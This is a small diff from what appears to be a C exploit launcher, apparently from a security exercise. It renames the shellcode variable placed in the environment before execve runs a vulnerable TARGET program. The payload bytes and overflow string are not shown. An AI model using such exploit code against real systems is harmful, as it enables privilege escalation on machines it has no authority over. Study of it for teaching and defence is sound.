@@ -33,7 +33,7 @@ int main(void)
   args[1] = str;
   args[2] = NULL;
   
-  env[0] = shellcode;
+  env[0] = shellcodeAlephOne;
   execve(TARGET, args, env);
   fprintf(stderr, "execve failed.\n");
   return 0;
